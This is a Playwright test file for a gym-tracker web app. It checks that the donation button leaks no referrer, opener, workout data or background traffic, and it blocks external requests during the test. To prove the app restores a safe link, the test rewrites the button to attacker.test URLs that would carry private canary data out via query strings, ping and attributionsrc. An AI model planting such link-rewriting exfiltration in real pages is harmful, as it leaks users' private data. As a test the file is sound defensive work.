// Backup concurrency and key-use checks. Synthetic identities; every HTTP request is
// served from this checkout and every WebSocket is intercepted before connecting.
const {chromium} = require('playwright');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const root = path.resolve(__dirname, '..');
const origin = 'https://gym.test';
const seed = {sessions: [], tourSeen: '2026-10-18', badges: {}, settings: {lang: 'it'}};
const types = {'.html':'text/html', '.js':'text/javascript', '.css':'text/css', '.json':'application/json', '.png':'image/png', '.wasm':'application/wasm', '.glb':'model/gltf-binary'};
const results = [];
const donationURL='https://buymeacoffee.com/fedemorlu24';
let browser;
async function fresh(initial = seed) {
  const context = await browser.newContext({locale:'it-IT', viewport:{width:390,height:844},serviceWorkers:'block'});
  const diag = {console:[],pageerror:[],failed:[],http:[],external:[],sockets:[]};
  await context.route('**/*', async route => {
    const u = new URL(route.request().url());
    if (u.origin !== origin) { diag.external.push(u.href); return route.abort(); }
    const file = path.resolve(root, '.' + (u.pathname === '/' ? '/index.html' : u.pathname));
    if (!file.startsWith(root + path.sep) || !fs.existsSync(file)) return route.fulfill({status:404,body:'missing'});
    return route.fulfill({body:fs.readFileSync(file),contentType:types[path.extname(file)] || 'application/octet-stream'});
  });
  await context.routeWebSocket('**', socket => { diag.sockets.push(socket.url()); socket.close(); });
  await context.addInitScript(initial => {
    if (!sessionStorage.getItem('fixture-seeded')) {
      localStorage.setItem('gym-tracker-v1',JSON.stringify(initial));
      sessionStorage.setItem('fixture-seeded','1');
    }
    window.__alerts=[]; window.alert = x => window.__alerts.push(String(x));
    window.confirm = () => true; window.prompt = () => 'synthetic-password';
  }, initial);
  await context.route('https://buymeacoffee.com/**', async route=>{
    const request=route.request();
    (diag.donations||(diag.donations=[])).push({url:request.url(),method:request.method(),headers:await request.allHeaders(),postData:request.postData()});
    return route.fulfill({contentType:'text/html',body:'<!doctype html><title>Payment destination fixture</title><p>Navigation only, no payment.</p>'});
  });
  const page=await context.newPage();
  page.on('console',m=>{if(m.type()==='error')diag.console.push(m.text());});
  page.on('pageerror',e=>diag.pageerror.push(e.message));
  page.on('requestfailed',r=>diag.failed.push({url:r.url(),error:r.failure()?.errorText}));
  page.on('response',r=>{if(r.status()>=400)diag.http.push({url:r.url(),status:r.status()});});
  await page.goto(origin+'/'); await ready(page);
  return {page,context,diag};
}
async function ready(page) {
  await page.waitForFunction(()=>window.gymBooted === true);
  await page.evaluate(async()=>{await window.gymDataReady; await Promise.all([...pendingWrites]);
    document.getElementById('tour').hidden=true; document.getElementById('install').hidden=true;});
}
async function test(name,fn,initial) {
  const f=await fresh(initial);
  try {await fn(f.page,f.diag);assert.deepEqual(f.diag.pageerror,[]);assert.deepEqual(f.diag.http,[]);
    assert.deepEqual(f.diag.external,[]);assert.deepEqual(f.diag.failed,[]);assert.deepEqual(f.diag.console,[]);assert.deepEqual(f.diag.sockets,[]);
    results.push({name,status:'pass',...f.diag}); console.log('PASS '+name);
  } catch(e) {console.error(name,f.diag);throw e;} finally {await f.context.close();}
}
const waitExport = page => page.waitForFunction(()=>backupFile && !document.getElementById('exp-btn')?.disabled);
async function downloadBackup(page) {
  const [download]=await Promise.all([page.waitForEvent('download'),page.locator('#exp-btn').click()]);
  const stream=await download.createReadStream(),chunks=[];
  for await(const chunk of stream)chunks.push(chunk);
  const envelope=JSON.parse(Buffer.concat(chunks).toString());
  await download.delete();return envelope;
}
async function holdFirstRead(page) {
  await page.evaluate(()=>{
    const read=photoTx,produce=prepareBackup;let first=true,seq=0;
    window.__completed=[];
    photoTx=async function(mode,fn){
      const hold=mode==='readonly'&&first;if(hold)first=false;
      const value=await read(mode,fn);
      if(hold)await new Promise(resolve=>window.__release=resolve);
      return value;
    };
    prepareBackup=async function(...args){const id=++seq;try{return await produce(...args);}finally{__completed.push(id);}};
    sheetBackup();
  });
  await page.waitForFunction(()=>typeof __release==='function');
}
(async()=>{
 browser=await chromium.launch();fs.mkdirSync(path.join(root,'artifacts/security'),{recursive:true});
 await test('donation navigation has no referrer, opener, app data or background traffic',async(page,diag)=>{
   await page.evaluate(()=>{db.sessions=[{id:'sensitive-id',date:'2026-10-19',name:'PRIVATE_WORKOUT_CANARY',exercises:[]}];db.profile={nick:'PRIVATE_PROFILE_CANARY'};save();go({name:'settings'});});await ready(page);
   assert.deepEqual(diag.donations||[],[]);
   assert.equal(await page.locator('iframe,script[src*="buymeacoffee"],link[rel=preconnect][href*="buymeacoffee"],link[rel=dns-prefetch][href*="buymeacoffee"]').count(),0);
   const original=await page.evaluate(()=>JSON.stringify(db));
   for(const action of ['click','keyboard','tampered']){
     if(action==='tampered')await page.locator('.donation-button').evaluate(link=>{
       link.href='https://attacker.test/collect?data=PRIVATE_WORKOUT_CANARY';link.target='_self';link.rel='opener';link.referrerPolicy='unsafe-url';
       link.setAttribute('ping','https://attacker.test/ping');link.setAttribute('attributionsrc','https://attacker.test/track');link.download='fake';
     });
     const popupPromise=page.context().waitForEvent('page');
     if(action==='keyboard'){await page.locator('.donation-button').focus();await page.keyboard.press('Enter');}
     else await page.locator('.donation-button').click(action==='middle'?{button:'middle'}:{});
     const popup=await popupPromise;await popup.bringToFront();await popup.waitForURL(donationURL);await popup.locator('p').waitFor();
     assert.equal(popup.url(),donationURL);assert.deepEqual(await popup.evaluate(()=>({opener:window.opener,referrer:document.referrer})),{opener:null,referrer:''});
     assert.equal(page.url(),origin+'/');await popup.close();
   }
   assert.equal(await page.evaluate(()=>JSON.stringify(db)),original);
   for(const request of diag.donations){assert.equal(request.url,donationURL);assert.equal(request.method,'GET');assert.equal(request.postData,null);assert.equal(request.headers.referer,undefined);assert.ok(!JSON.stringify(request).includes('PRIVATE_'));}
   assert.equal(diag.donations.length,3);
   await page.locator('.donation-button').evaluate(link=>{link.href='http://attacker.test/';link.dispatchEvent(new MouseEvent('auxclick',{bubbles:true,button:1,cancelable:true}));});
   assert.equal(await page.locator('.donation-button').getAttribute('href'),donationURL);
   await page.locator('.donation-button').evaluate(link=>{link.href='http://attacker.test/';link.rel='opener';link.setAttribute('ping','https://attacker.test/');});
   await page.locator('.donation-button').click({button:'right'});
   assert.deepEqual(await page.locator('.donation-button').evaluate(link=>({url:link.href,rel:link.rel,referrer:link.referrerPolicy,ping:link.hasAttribute('ping')})),{url:donationURL,rel:'noopener noreferrer',referrer:'no-referrer',ping:false});
   await page.keyboard.press('Escape');await page.screenshot({path:path.join(root,'artifacts/security/donation-protected.png')});
 });
 fs.writeFileSync(path.join(root,'artifacts/security/outbound-results.json'),JSON.stringify({results},null,2));
})().catch(e=>{console.error(e);process.exitCode=1;}).finally(async()=>{await browser?.close();});
